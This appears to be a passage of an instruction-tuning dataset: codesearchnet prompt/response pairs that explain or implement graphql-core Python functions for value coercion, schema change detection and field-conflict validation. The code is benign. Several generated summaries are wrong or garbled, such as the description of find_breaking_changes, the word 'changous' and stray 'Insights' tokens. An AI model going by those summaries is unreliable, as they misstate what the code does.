of_errors(errors) if errors else of_value(coerced_value_list)\n        # Lists accept a non-list value as a list of one.\n        coerced_item = coerce_value(value, item_type, blame_node)\n        return coerced_item if coerced_item.errors else of_value([coerced_item.value])\n\n    if is_input_object_type(type_):\n        type_ = cast(GraphQLInputObjectType, type_)\n        if not isinstance(value, dict):\n            return of_errors(\n                [\n                    coercion_error(\n                        f\"Expected type {type_.name} to be a dict\", blame_node, path\n                    )\n                ]\n            )\n        errors = None\n        coerced_value_dict: Dict[str, Any] = {}\n        fields = type_.fields\n\n        # Ensure every defined field is valid.\n        for field_name, field in fields.items():\n            field_value = value.get(field_name, INVALID)\n            if is_invalid(field_value):\n                if not is_invalid(field.default_value):\n                    coerced_value_dict[field_name] = field.default_value\n                elif is_non_null_type(field.type):\n                    errors = add(\n                        errors,\n                        coercion_error(\n                            f\"Field {print_path(at_path(path, field_name))}\"\n                            f\" of required type {field.type} was not provided\",\n                            blame_node,\n                        ),\n                    )\n            else:\n                coerced_field = coerce_value(\n                    field_value, field.type, blame_node, at_path(path, field_name)\n                )\n                if coerced_field.errors:\n                    errors = add(errors, *coerced_field.errors)\n                else:\n                    coerced_value_dict[field_name] = coerced_field.value\n\n        # Ensure every provided field is defined.\n        for field_name in value:\n            if field_name not in fields:\n                suggestions = suggestion_list(field_name, fields)\n                did_you_mean = (\n                    f\"did you mean {or_list(suggestions)}?\" if suggestions else None\n                )\n                errors = add(\n                    errors,\n                    coercion_error(\n                        f\"Field '{field_name}' is not defined by type {type_.name}\",\n                        blame_node,\n                        path,\n                        did_you_mean,\n                    ),\n                )\n\n        return of_errors(errors) if errors else of_value(coerced_value_dict)\n\n    # Not reachable. All possible input types have been considered.\n    raise TypeError(f\"Unexpected input type: '{inspect(type_)}'.\")", "response": "Coerce a Python value given a GraphQL Type."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a GraphQLError instance for coercion errors.", "response": "def coercion_error(\n    message: str,\n    blame_node: Node = None,\n    path: Path = None,\n    sub_message: str = None,\n    original_error: Exception = None,\n) -> GraphQLError:\n    \"\"\"Return a GraphQLError instance\"\"\"\n    if path:\n        path_str = print_path(path)\n        message += f\" at {path_str}\"\n    message += f\"; {sub_message}\" if sub_message else \".\"\n    # noinspection PyArgumentEqualDefault\n    return GraphQLError(message, blame_node, None, None, None, original_error)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding string describing the path into the value where error was found", "response": "def print_path(path: Path) -> str:\n    \"\"\"Build string describing the path into the value where error was found\"\"\"\n    path_str = \"\"\n    current_path: Optional[Path] = path\n    while current_path:\n        path_str = (\n            f\".{current_path.key}\"\n            if isinstance(current_path.key, str)\n            else f\"[{current_path.key}]\"\n        ) + path_str\n        current_path = current_path.prev\n    return f\"value{path_str}\" if path_str else \"\""}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nparses an integer value node in the AST.", "response": "def parse_int_literal(ast, _variables=None):\n    \"\"\"Parse an integer value node in the AST.\"\"\"\n    if isinstance(ast, IntValueNode):\n        num = int(ast.value)\n        if MIN_INT <= num <= MAX_INT:\n            return num\n    return INVALID"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses a float value node in the AST.", "response": "def parse_float_literal(ast, _variables=None):\n    \"\"\"Parse a float value node in the AST.\"\"\"\n    if isinstance(ast, (FloatValueNode, IntValueNode)):\n        return float(ast.value)\n    return INVALID"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_id_literal(ast, _variables=None):\n    if isinstance(ast, (StringValueNode, IntValueNode)):\n        return ast.value\n    return INVALID", "response": "Parse an ID value node in the AST."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef find_breaking_changes(\n    old_schema: GraphQLSchema, new_schema: GraphQLSchema\n) -> List[BreakingChange]:\n    \"\"\"Find breaking changes.\n\n    Given two schemas, returns a list containing descriptions of all the types of\n    breaking changes covered by the other functions down below.\n    \"\"\"\n    return (\n        find_removed_types(old_schema, new_schema)\n        + find_types_that_changed_kind(old_schema, new_schema)\n        + find_fields_that_changed_type_on_object_or_interface_types(\n            old_schema, new_schema\n        )\n        + find_fields_that_changed_type_on_input_object_types(\n            old_schema, new_schema\n        ).breaking_changes\n        + find_types_removed_from_unions(old_schema, new_schema)\n        + find_values_removed_from_enums(old_schema, new_schema)\n        + find_arg_changes(old_schema, new_schema).breaking_changes\n        + find_interfaces_removed_from_object_types(old_schema, new_schema)\n        + find_removed_directives(old_schema, new_schema)\n        + find_removed_directive_args(old_schema, new_schema)\n        + find_added_non_null_directive_args(old_schema, new_schema)\n        + find_removed_directive_locations(old_schema, new_schema)\n    )", "response": "Given two schemas returns a list containing descriptions of all the types of the types that have been removed from the object types and that have been added to the object types."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef find_dangerous_changes(\n    old_schema: GraphQLSchema, new_schema: GraphQLSchema\n) -> List[DangerousChange]:\n    \"\"\"Find dangerous changes.\n\n    Given two schemas, returns a list containing descriptions of all the types of\n    potentially dangerous changes covered by the other functions down below.\n    \"\"\"\n    return (\n        find_arg_changes(old_schema, new_schema).dangerous_changes\n        + find_values_added_to_enums(old_schema, new_schema)\n        + find_interfaces_added_to_object_types(old_schema, new_schema)\n        + find_types_added_to_unions(old_schema, new_schema)\n        + find_fields_that_changed_type_on_input_object_types(\n            old_schema, new_schema\n        ).dangerous_changes\n    )", "response": "Given two schemas returns a list of descriptions of all the types of the object types that are dangerous changes."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef find_removed_types(\n    old_schema: GraphQLSchema, new_schema: GraphQLSchema\n) -> List[BreakingChange]:\n    \"\"\"Find removed types.\n\n    Given two schemas, returns a list containing descriptions of any breaking changes\n    in the newSchema related to removing an entire type.\n    \"\"\"\n    old_type_map = old_schema.type_map\n    new_type_map = new_schema.type_map\n\n    breaking_changes = []\n    for type_name in old_type_map:\n        if type_name not in new_type_map:\n            breaking_changes.append(\n                BreakingChange(\n                    BreakingChangeType.TYPE_REMOVED, f\"{type_name} was removed.\"\n                )\n            )\n    return breaking_changes", "response": "Find removed types. Given two schemas returns a list containing descriptions of any breaking changes\n    in the newSchema related to removing an entire type."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_types_that_changed_kind(\n    old_schema: GraphQLSchema, new_schema: GraphQLSchema\n) -> List[BreakingChange]:\n    \"\"\"Find types that changed kind\n\n    Given two schemas, returns a list containing descriptions of any breaking changes\n    in the newSchema related to changing the type of a type.\n    \"\"\"\n    old_type_map = old_schema.type_map\n    new_type_map = new_schema.type_map\n\n    breaking_changes = []\n    for type_name in old_type_map:\n        if type_name not in new_type_map:\n            continue\n        old_type = old_type_map[type_name]\n        new_type = new_type_map[type_name]\n        if old_type.__class__ is not new_type.__class__:\n            breaking_changes.append(\n                BreakingChange(\n                    BreakingChangeType.TYPE_CHANGED_KIND,\n                    f\"{type_name} changed from {type_kind_name(old_type)}\"\n                    f\" to {type_kind_name(new_type)}.\",\n                )\n            )\n    return breaking_changes", "response": "Given two schemas returns a list of descriptions of any breaking changes\n    in the newSchema related to changing the type of a type."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_arg_changes(\n    old_schema: GraphQLSchema, new_schema: GraphQLSchema\n) -> BreakingAndDangerousChanges:\n    \"\"\"Find argument changes.\n\n    Given two schemas, returns a list containing descriptions of any breaking or\n    dangerous changes in the new_schema related to arguments (such as removal or change\n    of type of an argument, or a change in an argument's default value).\n    \"\"\"\n    old_type_map = old_schema.type_map\n    new_type_map = new_schema.type_map\n\n    breaking_changes: List[BreakingChange] = []\n    dangerous_changes: List[DangerousChange] = []\n\n    for type_name, old_type in old_type_map.items():\n        new_type = new_type_map.get(type_name)\n        if (\n            not (is_object_type(old_type) or is_interface_type(old_type))\n            or not (is_object_type(new_type) or is_interface_type(new_type))\n            or new_type.__class__ is not old_type.__class__\n        ):\n            continue\n        old_type = cast(Union[GraphQLObjectType, GraphQLInterfaceType], old_type)\n        new_type = cast(Union[GraphQLObjectType, GraphQLInterfaceType], new_type)\n\n        old_type_fields = old_type.fields\n        new_type_fields = new_type.fields\n        for field_name in old_type_fields:\n            if field_name not in new_type_fields:\n                continue\n\n            old_args = old_type_fields[field_name].args\n            new_args = new_type_fields[field_name].args\n            for arg_name, old_arg in old_args.items():\n                new_arg = new_args.get(arg_name)\n                if not new_arg:\n                    # Arg not present\n                    breaking_changes.append(\n                        BreakingChange(\n                            BreakingChangeType.ARG_REMOVED,\n                            f\"{old_type.name}.{field_name} arg\"\n                            f\" {arg_name} was removed\",\n                        )\n                    )\n                    continue\n                is_safe = is_change_safe_for_input_object_field_or_field_arg(\n                    old_arg.type, new_arg.type\n                )\n                if not is_safe:\n                    breaking_changes.append(\n                        BreakingChange(\n                            BreakingChangeType.ARG_CHANGED_KIND,\n                            f\"{old_type.name}.{field_name} arg\"\n                            f\" {arg_name} has changed type from\"\n                            f\" {old_arg.type} to {new_arg.type}\",\n                        )\n                    )\n                elif (\n                    old_arg.default_value is not INVALID\n                    and old_arg.default_value != new_arg.default_value\n                ):\n                    dangerous_changes.append(\n                        DangerousChange(\n                            DangerousChangeType.ARG_DEFAULT_VALUE_CHANGE,\n                            f\"{old_type.name}.{field_name} arg\"\n                            f\" {arg_name} has changed defaultValue\",\n                        )\n                    )\n\n            # Check if arg was added to the field\n            for arg_name in new_args:\n                if arg_name not in old_args:\n                    new_arg_def = new_args[arg_name]\n                    if is_required_argument(new_arg_def):\n                        breaking_changes.append(\n                            BreakingChange(\n                                BreakingChangeType.REQUIRED_ARG_ADDED,\n                                f\"A required arg {arg_name} on\"\n                                f\" {type_name}.{field_name} was added\",\n                            )\n                        )\n                    else:\n                        dangerous_changes.append(\n                            DangerousChange(\n                                DangerousChangeType.OPTIONAL_ARG_ADDED,\n                                f\"An optional arg {arg_name} on\"\n                                f\" {type_name}.{field_name} was added\",\n                            )\n                        )\n\n    return BreakingAndDangerousChanges(breaking_changes, dangerous_changes)", "response": "Given two schemas returns a list containing descriptions of any breaking or changous changes related to arguments."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef find_types_removed_from_unions(\n    old_schema: GraphQLSchema, new_schema: GraphQLSchema\n) -> List[BreakingChange]:\n    \"\"\"Find types removed from unions.\n\n    Given two schemas, returns a list containing descriptions of any breaking changes\n    in the new_schema related to removing types from a union type.\n    \"\"\"\n    old_type_map = old_schema.type_map\n    new_type_map = new_schema.type_map\n\n    types_removed_from_union = []\n    for old_type_name, old_type in old_type_map.items():\n        new_type = new_type_map.get(old_type_name)\n        if not (is_union_type(old_type) and is_union_type(new_type)):\n            continue\n        old_type = cast(GraphQLUnionType, old_type)\n        new_type = cast(GraphQLUnionType, new_type)\n        type_names_in_new_union = {type_.name for type_ in new_type.types}\n        for type_ in old_type.types:\n            type_name = type_.name\n            if type_name not in type_names_in_new_union:\n                types_removed_from_union.append(\n                    BreakingChange(\n                        BreakingChangeType.TYPE_REMOVED_FROM_UNION,\n                        f\"{type_name} was removed from union type {old_type_name}.\",\n                    )\n                )\n    return types_removed_from_union", "response": "Given two schemas returns a list containing descriptions of any breaking changes\nInsights"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef find_types_added_to_unions(\n    old_schema: GraphQLSchema, new_schema: GraphQLSchema\n) -> List[DangerousChange]:\n    \"\"\"Find types added to union.\n\n    Given two schemas, returns a list containing descriptions of any dangerous changes\n    in the new_schema related to adding types to a union type.\n    \"\"\"\n    old_type_map = old_schema.type_map\n    new_type_map = new_schema.type_map\n\n    types_added_to_union = []\n    for new_type_name, new_type in new_type_map.items():\n        old_type = old_type_map.get(new_type_name)\n        if not (is_union_type(old_type) and is_union_type(new_type)):\n            continue\n        old_type = cast(GraphQLUnionType, old_type)\n        new_type = cast(GraphQLUnionType, new_type)\n        type_names_in_old_union = {type_.name for type_ in old_type.types}\n        for type_ in new_type.types:\n            type_name = type_.name\n            if type_name not in type_names_in_old_union:\n                types_added_to_union.append(\n                    DangerousChange(\n                        DangerousChangeType.TYPE_ADDED_TO_UNION,\n                        f\"{type_name} was added to union type {new_type_name}.\",\n                    )\n                )\n    return types_added_to_union", "response": "Given two schemas returns a list containing descriptions of any dangerous changes\nInsights in the new_schema related to adding types to a union."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef find_values_removed_from_enums(\n    old_schema: GraphQLSchema, new_schema: GraphQLSchema\n) -> List[BreakingChange]:\n    \"\"\"Find values removed from enums.\n\n    Given two schemas, returns a list containing descriptions of any breaking changes\n    in the new_schema related to removing values from an enum type.\n    \"\"\"\n    old_type_map = old_schema.type_map\n    new_type_map = new_schema.type_map\n\n    values_removed_from_enums = []\n    for type_name, old_type in old_type_map.items():\n        new_type = new_type_map.get(type_name)\n        if not (is_enum_type(old_type) and is_enum_type(new_type)):\n            continue\n        old_type = cast(GraphQLEnumType, old_type)\n        new_type = cast(GraphQLEnumType, new_type)\n        values_in_new_enum = new_type.values\n        for value_name in old_type.values:\n            if value_name not in values_in_new_enum:\n                values_removed_from_enums.append(\n                    BreakingChange(\n                        BreakingChangeType.VALUE_REMOVED_FROM_ENUM,\n                        f\"{value_name} was removed from enum type {type_name}.\",\n                    )\n                )\n    return values_removed_from_enums", "response": "Given two schemas returns a list of descriptions of any breaking changes\nInsights in the new_schema related to removing values from an enum type."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngiving two schemas returns a list containing descriptions of any dangerous changes in the new_schema related to adding values to an enum type.", "response": "def find_values_added_to_enums(\n    old_schema: GraphQLSchema, new_schema: GraphQLSchema\n) -> List[DangerousChange]:\n    \"\"\"Find values added to enums.\n\n    Given two schemas, returns a list containing descriptions of any dangerous changes\n    in the new_schema related to adding values to an enum type.\n    \"\"\"\n    old_type_map = old_schema.type_map\n    new_type_map = new_schema.type_map\n\n    values_added_to_enums = []\n    for type_name, old_type in old_type_map.items():\n        new_type = new_type_map.get(type_name)\n        if not (is_enum_type(old_type) and is_enum_type(new_type)):\n            continue\n        old_type = cast(GraphQLEnumType, old_type)\n        new_type = cast(GraphQLEnumType, new_type)\n        values_in_old_enum = old_type.values\n        for value_name in new_type.values:\n            if value_name not in values_in_old_enum:\n                values_added_to_enums.append(\n                    DangerousChange(\n                        DangerousChangeType.VALUE_ADDED_TO_ENUM,\n                        f\"{value_name} was added to enum type {type_name}.\",\n                    )\n                )\n    return values_added_to_enums"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns true if a value is a finite number.", "response": "def is_finite(value: Any) -> bool:\n    \"\"\"Return true if a value is a finite number.\"\"\"\n    return isinstance(value, int) or (isinstance(value, float) and isfinite(value))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef find_conflicts_within_selection_set(\n    context: ValidationContext,\n    cached_fields_and_fragment_names: Dict,\n    compared_fragment_pairs: \"PairSet\",\n    parent_type: Optional[GraphQLNamedType],\n    selection_set: SelectionSetNode,\n) -> List[Conflict]:\n    \"\"\"Find conflicts within selection set.\n\n    Find all conflicts found \"within\" a selection set, including those found via\n    spreading in fragments.\n\n    Called when visiting each SelectionSet in the GraphQL Document.\n    \"\"\"\n    conflicts: List[Conflict] = []\n\n    field_map, fragment_names = get_fields_and_fragment_names(\n        context, cached_fields_and_fragment_names, parent_type, selection_set\n    )\n\n    # (A) Find all conflicts \"within\" the fields of this selection set.\n    # Note: this is the *only place* `collect_conflicts_within` is called.\n    collect_conflicts_within(\n        context,\n        conflicts,\n        cached_fields_and_fragment_names,\n        compared_fragment_pairs,\n        field_map,\n    )\n\n    if fragment_names:\n        compared_fragments: Set[str] = set()\n        # (B) Then collect conflicts between these fields and those represented by each\n        # spread fragment name found.\n        for i, fragment_name in enumerate(fragment_names):\n            collect_conflicts_between_fields_and_fragment(\n                context,\n                conflicts,\n                cached_fields_and_fragment_names,\n                compared_fragments,\n                compared_fragment_pairs,\n                False,\n                field_map,\n                fragment_name,\n            )\n            # (C) Then compare this fragment with all other fragments found in this\n            # selection set to collect conflicts within fragments spread together.\n            # This compares each item in the list of fragment names to every other\n            # item in that same list (except for itself).\n            for other_fragment_name in fragment_names[i + 1 :]:\n                collect_conflicts_between_fragments(\n                    context,\n                    conflicts,\n                    cached_fields_and_fragment_names,\n                    compared_fragment_pairs,\n                    False,\n                    fragment_name,\n                    other_fragment_name,\n                )\n\n    return conflicts", "response": "Find all conflicts found within a SelectionSet."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncollects any conflicts between fields and fragments.", "response": "def collect_conflicts_between_fields_and_fragment(\n    context: ValidationContext,\n    conflicts: List[Conflict],\n    cached_fields_and_fragment_names: Dict,\n    compared_fragments: Set[str],\n    compared_fragment_pairs: \"PairSet\",\n    are_mutually_exclusive: bool,\n    field_map: NodeAndDefCollection,\n    fragment_name: str,\n) -> None:\n    \"\"\"Collect conflicts between fields and fragment.\n\n    Collect all conflicts found between a set of fields and a fragment reference\n    including via spreading in any nested fragments.\n    \"\"\"\n    # Memoize so a fragment is not compared for conflicts more than once.\n    if fragment_name in compared_fragments:\n        return\n    compared_fragments.add(fragment_name)\n\n    fragment = context.get_fragment(fragment_name)\n    if not fragment:\n        return None\n\n    field_map2, fragment_names2 = get_referenced_fields_and_fragment_names(\n        context, cached_fields_and_fragment_names, fragment\n    )\n\n    # Do not compare a fragment's fieldMap to itself.\n    if field_map is field_map2:\n        return\n\n    # (D) First collect any conflicts between the provided collection of fields and the\n    # collection of fields represented by the given fragment.\n    collect_conflicts_between(\n        context,\n        conflicts,\n        cached_fields_and_fragment_names,\n        compared_fragment_pairs,\n        are_mutually_exclusive,\n        field_map,\n        field_map2,\n    )\n\n    # (E) Then collect any conflicts between the provided collection of fields and any\n    # fragment names found in the given fragment.\n    for fragment_name2 in fragment_names2:\n        collect_conflicts_between_fields_and_fragment(\n            context,\n            conflicts,\n            cached_fields_and_fragment_names,\n            compared_fragments,\n            compared_fragment_pairs,\n            are_mutually_exclusive,\n            field_map,\n            fragment_name2,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef collect_conflicts_between_fragments(\n    context: ValidationContext,\n    conflicts: List[Conflict],\n    cached_fields_and_fragment_names: Dict,\n    compared_fragment_pairs: \"PairSet\",\n    are_mutually_exclusive: bool,\n    fragment_name1: str,\n    fragment_name2: str,\n) -> None:\n    \"\"\"Collect conflicts between fragments.\n\n    Collect all conflicts found between two fragments, including via spreading in any\n    nested fragments.\n    \"\"\"\n    # No need to compare a fragment to itself.\n    if fragment_name1 == fragment_name2:\n        return\n\n    # Memoize so two fragments are not compared for conflicts more than once.\n    if compared_fragment_pairs.has(\n        fragment_name1, fragment_name2, are_mutually_exclusive\n    ):\n        return\n    compared_fragment_pairs.add(fragment_name1, fragment_name2, are_mutually_exclusive)\n\n    fragment1 = context.get_fragment(fragment_name1)\n    fragment2 = context.get_fragment(fragment_name2)\n    if not fragment1 or not fragment2:\n        return None\n\n    field_map1, fragment_names1 = get_referenced_fields_and_fragment_names(\n        context, cached_fields_and_fragment_names, fragment1\n    )\n\n    field_map2, fragment_names2 = get_referenced_fields_and_fragment_names(\n        context, cached_fields_and_fragment_names, fragment2\n    )\n\n    # (F) First, collect all conflicts between these two collections of fields\n    # (not including any nested fragments)\n    collect_conflicts_between(\n        context,\n        conflicts,\n        cached_fields_and_fragment_names,\n        compared_fragment_pairs,\n        are_mutually_exclusive,\n        field_map1,\n        field_map2,\n    )\n\n    # (G) Then collect conflicts between the first fragment and any nested fragments\n    # spread in the second fragment.\n    for nested_fragment_name2 in fragment_names2:\n        collect_conflicts_between_fragments(\n            context,\n            conflicts,\n            cached_fields_and_fragment_names,\n            compared_fragment_pairs,\n            are_mutually_exclusive,\n            fragment_name1,\n            nested_fragment_name2,\n        )\n\n    # (G) Then collect conflicts between the second fragment and any nested fragments\n    # spread in the first fragment.\n    for nested_fragment_name1 in fragment_names1:\n        collect_conflicts_between_fragments(\n            context,\n            conflicts,\n            cached_fields_and_fragment_names,\n            compared_fragment_pairs,\n            are_mutually_exclusive,\n            nested_fragment_name1,\n            fragment_name2,\n        )", "response": "Collect all conflicts between two fragments."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef find_conflicts_between_sub_selection_sets(\n    context: ValidationContext,\n    cached_fields_and_fragment_names: Dict,\n    compared_fragment_pairs: \"PairSet\",\n    are_mutually_exclusive: bool,\n    parent_type1: Optional[GraphQLNamedType],\n    selection_set1: SelectionSetNode,\n    parent_type2: Optional[GraphQLNamedType],\n    selection_set2: SelectionSetNode,\n) -> List[Conflict]:\n    \"\"\"Find conflicts between sub selection sets.\n\n    Find all conflicts found between two selection sets, including those found via\n    spreading in fragments. Called when determining if conflicts exist between the\n    sub-fields of two overlapping fields.\n    \"\"\"\n    conflicts: List[Conflict] = []\n\n    field_map1, fragment_names1 = get_fields_and_fragment_names(\n        context, cached_fields_and_fragment_names, parent_type1, selection_set1\n    )\n    field_map2, fragment_names2 = get_fields_and_fragment_names(\n        context, cached_fields_and_fragment_names, parent_type2, selection_set2\n    )\n\n    # (H) First, collect all conflicts between these two collections of field.\n    collect_conflicts_between(\n        context,\n        conflicts,\n        cached_fields_and_fragment_names,\n        compared_fragment_pairs,\n        are_mutually_exclusive,\n        field_map1,\n        field_map2,\n    )\n\n    # (I) Then collect conflicts between the first collection of fields and those\n    # referenced by each fragment name associated with the second.\n    if fragment_names2:\n        compared_fragments: Set[str] = set()\n        for fragment_name2 in fragment_names2:\n            collect_conflicts_between_fields_and_fragment(\n                context,\n                conflicts,\n                cached_fields_and_fragment_names,\n                compared_fragments,\n                compared_fragment_pairs,\n                are_mutually_exclusive,\n                field_map1,\n                fragment_name2,\n            )\n\n    # (I) Then collect conflicts between the second collection of fields and those\n    # referenced by each fragment name associated with the first.\n    if fragment_names1:\n        compared_fragments = set()\n        for fragment_name1 in fragment_names1:\n            collect_conflicts_between_fields_and_fragment(\n                context,\n                conflicts,\n                cached_fields_and_fragment_names,\n                compared_fragments,\n                compared_fragment_pairs,\n                are_mutually_exclusive,\n                field_map2,\n                fragment_name1,\n            )\n\n    # (J) Also collect conflicts between any fragment names by the first and fragment\n    # names by the second. This compares each item in the first set of names to each\n    # item in the second set of names.\n    for fragment_name1 in fragment_names1:\n        for fragment_name2 in fragment_names2:\n            collect_conflicts_between_fragments(\n                context,\n                conflicts,\n                cached_fields_and_fragment_names,\n                compared_fragment_pairs,\n                are_mutually_exclusive,\n                fragment_name1,\n                fragment_name2,\n            )\n\n    return conflicts", "response": "Find all conflicts between two sub - selection sets."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef collect_conflicts_within(\n    context: ValidationContext,\n    conflicts: List[Conflict],\n    cached_fields_and_fragment_names: Dict,\n    compared_fragment_pairs: \"PairSet\",\n    field_map: NodeAndDefCollection,\n) -> None:\n    \"\"\"Collect all Conflicts \"within\" one collection of fields.\"\"\"\n    # A field map is a keyed collection, where each key represents a response name and\n    # the value at that key is a list of all fields which provide that response name.\n    # For every response name, if there are multiple fields, they must be compared to\n    # find a potential conflict.\n    for response_name, fields in field_map.items():\n        # This compares every field in the list to every other field in this list\n        # (except to itself). If the list only has one item, nothing needs to be\n        # compared.\n        if len(fields) > 1:\n            for i, field in enumerate(fields):\n                for other_field in fields[i + 1 :]:\n                    conflict = find_conflict(\n                        context,\n                        cached_fields_and_fragment_names,\n                        compared_fragment_pairs,\n                        # within one collection is never mutually exclusive\n                        False,\n                        response_name,\n                        field,\n                        other_field,\n                    )\n                    if conflict:\n                        conflicts.append(conflict)", "response": "Collect all Conflicts within one collection of fields."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef collect_conflicts_between(\n    context: ValidationContext,\n    conflicts: List[Conflict],\n    cached_fields_and_fragment_names: Dict,\n    compared_fragment_pairs: \"PairSet\",\n    parent_fields_are_mutually_exclusive: bool,\n    field_map1: NodeAndDefCollection,\n    field_map2: NodeAndDefCollection,\n) -> None:\n    \"\"\"Collect all Conflicts between two collections of fields.\n\n    This is similar to, but different from the `collectConflictsWithin` function above.\n    This check assumes that `collectConflictsWithin` has already been called on each\n    provided collection of fields. This is true because this validator traverses each\n    individual selection set.\n    \"\"\"\n    # A field map is a keyed collection, where each key represents a response name and\n    # the value at that key is a list of all fields which provide that response name.\n    # For any response name which appears in both provided field maps, each field from\n    # the first field map must be compared to every field in the second field map to\n    # find potential conflicts.\n    for response_name, fields1 in field_map1.items():\n        fields2 = field_map2.get(response_name)\n        if fields2:\n            for field1 in fields1:\n                for field2 in fields2:\n                    conflict = find_conflict(\n                        context,\n                        cached_fields_and_fragment_names,\n                        compared_fragment_pairs,\n                        parent_fields_are_mutually_exclusive,\n                        response_name,\n                        field1,\n                        field2,\n                    )\n                    if conflict:\n                        conflicts.append(conflict)", "response": "Collect all Conflicts between two collections of fields."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfinds a conflict between two fields.", "response": "def find_conflict(\n    context: ValidationContext,\n    cached_fields_and_fragment_names: Dict,\n    compared_fragment_pairs: \"PairSet\",\n    parent_fields_are_mutually_exclusive: bool,\n    response_name: str,\n    field1: NodeAndDef,\n    field2: NodeAndDef,\n) -> Optional[Conflict]:\n    \"\"\"Find conflict.\n\n    Determines if there is a conflict between two particular fields, including comparing\n    their sub-fields.\n    \"\"\"\n    parent_type1, node1, def1 = field1\n    parent_type2, node2, def2 = field2\n\n    # If it is known that two fields could not possibly apply at the same time, due to\n    # the parent types, then it is safe to permit them to diverge in aliased field or\n    # arguments used as they will not present any ambiguity by differing. It is known\n    # that two parent types could never overlap if they are different Object types.\n    # Interface or Union types might overlap - if not in the current state of the\n    # schema, then perhaps in some future version, thus may not safely diverge.\n    are_mutually_exclusive = parent_fields_are_mutually_exclusive or (\n        parent_type1 != parent_type2\n        and is_object_type(parent_type1)\n        and is_object_type(parent_type2)\n    )\n\n    # The return type for each field.\n    type1 = cast(Optional[GraphQLOutputType], def1 and def1.type)\n    type2 = cast(Optional[GraphQLOutputType], def2 and def2.type)\n\n    if not are_mutually_exclusive:\n        # Two aliases must refer to the same field.\n        name1 = node1.name.value\n        name2 = node2.name.value\n        if name1 != name2:\n            return (\n                (response_name, f\"{name1} and {name2} are different fields\"),\n                [node1],\n                [node2],\n            )\n\n        # Two field calls must have the same arguments.\n        if not same_arguments(node1.arguments or [], node2.arguments or []):\n            return (response_name, \"they have differing arguments\"), [node1], [node2]\n\n    if type1 and type2 and do_types_conflict(type1, type2):\n        return (\n            (response_name, f\"they return conflicting types {type1} and {type2}\"),\n            [node1],\n            [node2],\n        )\n\n    # Collect and compare sub-fields. Use the same \"visited fragment names\" list for\n    # both collections so fields in a fragment reference are never compared to\n    # themselves.\n    selection_set1 = node1.selection_set\n    selection_set2 = node2.selection_set\n    if selection_set1 and selection_set2:\n        conflicts = find_conflicts_between_sub_selection_sets(\n            context,\n            cached_fields_and_fragment_names,\n            compared_fragment_pairs,\n            are_mutually_exclusive,\n            get_named_type(type1),\n            selection_set1,\n            get_named_type(type2),\n            selection_set2,\n        )\n        return subfield_conflicts(conflicts, response_name, node1, node2)\n\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef do_types_conflict(type1: GraphQLOutputType, type2: GraphQLOutputType) -> bool:\n    if is_list_type(type1):\n        return (\n            do_types_conflict(\n                cast(GraphQLList, type1).of_type, cast(GraphQLList, type2).of_type\n            )\n            if is_list_type(type2)\n            else True\n        )\n    if is_list_type(type2):\n        return True\n    if is_non_null_type(type1):\n        return (\n            do_types_conflict(\n                cast(GraphQLNonNull, type1).of_type, cast(GraphQLNonNull, type2).of_type\n            )\n            if is_non_null_type(type2)\n            else True\n        )\n    if is_non_null_type(type2):\n        return True\n    if is_leaf_type(type1) or is_leaf_type(type2):\n        return type1 is not type2\n    return False", "response": "Checks whether two types conflict with another type."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting fields and referenced fragment names given a selection set.", "response": "def get_fields_and_fragment_names(\n    context: ValidationContext,\n    cached_fields_and_fragment_names: Dict,\n    parent_type: Optional[GraphQLNamedType],\n    selection_set: SelectionSetNode,\n) -> Tuple[NodeAndDefCollection, List[str]]:\n    \"\"\"Get fields and referenced fragment names\n\n    Given a selection set, return the collection of fields (a mapping of response name\n    to field nodes and definitions) as well as a list of fragment names referenced via\n    fragment spreads.\n    \"\"\"\n    cached = cached_fields_and_fragment_names.get(selection_set)\n    if not cached:\n        node_and_defs: NodeAndDefCollection = {}\n        fragment_names: Dict[str, bool] = {}\n        collect_fields_and_fragment_names(\n            context, parent_type, selection_set, node_and_defs, fragment_names\n        )\n        cached = (node_and_defs, list(fragment_names))\n        cached_fields_and_fragment_names[selection_set] = cached\n    return cached"}
